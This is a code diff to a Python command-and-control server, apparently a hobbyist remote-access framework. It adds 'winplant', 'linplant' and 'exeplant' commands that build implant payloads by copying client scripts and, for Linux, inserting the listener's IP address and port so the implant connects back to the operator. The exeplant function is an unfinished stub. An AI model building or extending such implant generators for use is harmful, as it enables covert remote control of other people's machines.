@@ -4,6 +4,11 @@ import threading
 from prettytable import PrettyTable
 import time
 from datetime import datetime
+import random
+import string
+import os
+import shutil
+import platform
 
 
 def banner():
@@ -91,6 +96,65 @@ def session_handler(session_id):
         print(response)
 
 
+def generate_random_string(length):
+    characters = string.ascii_lowercase
+    random_string = ''.join(random.choice(characters) for _ in range(length))
+    return random_string
+
+
+def winplant():
+    name_generator = generate_random_string(6)
+    # file_name = f'{name_generator}.py'
+    file_name = 'winpayload.py'
+    check_pwd = os.getcwd()
+    if platform.system() == 'Windows':
+        if os.path.exists(f'{check_pwd}\\winclient.py'):
+            shutil.copy('winclient.py', file_name)
+        else:
+            print('[-] winclient.py file not found')
+    else:
+        if os.path.exists(f'{check_pwd}/winclient.py'):
+            shutil.copy('winclient.py', file_name)
+        else:
+            print('[-] winclient.py file not found')
+
+    print(file_name)
+
+
+def linplant():
+    name_generator = generate_random_string(6)
+    # file_name = f'{name_generator}.py'
+    file_name = 'payload.py'
+    check_pwd = os.getcwd()
+    if platform.system() == 'Windows':
+        if os.path.exists(f'{check_pwd}\\client.py'):
+            shutil.copy('client.py', file_name)
+        else:
+            print('[-] client.py file not found')
+    else:
+        if os.path.exists(f'{check_pwd}/client.py'):
+            shutil.copy('client.py', file_name)
+        else:
+            print('[-] client.py file not found')
+
+    replacements = {"INPUT_IP_HERE": host_ip,
+                    "INPUT_PORT_HERE": host_port}
+    with open(file_name, 'r') as file:
+        file_content = file.read()
+    for old_string, new_string in replacements.items():
+        file_content = file_content.replace(old_string, new_string)
+    with open(file_name, 'w') as f:
+        f.write(file_content)
+
+    print(file_name)
+
+
+def exeplant():
+    name_generator = generate_random_string(6)
+    file_name = f'{name_generator}.py'
+    print(file_name)
+
+
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     banner()
@@ -125,6 +189,27 @@ if __name__ == '__main__':
                 exit_flag = True
                 sock.close()
                 break
+
+            if command == 'winplant':
+                if listener_counter > 0:
+                    winplant()
+                else:
+                    print(
+                        '[-] You cannot generate a payload without an active listener.')
+
+            if command == 'linplant':
+                if listener_counter > 0:
+                    linplant()
+                else:
+                    print(
+                        '[-] You cannot generate a payload without an active listener.')
+
+            if command == 'exeplant':
+                if listener_counter > 0:
+                    exeplant()
+                else:
+                    print(
+                        '[-] You cannot generate a payload without an active listener.')
 
         except KeyboardInterrupt:
             print('\n [-] Keyboard interrupt issued.')
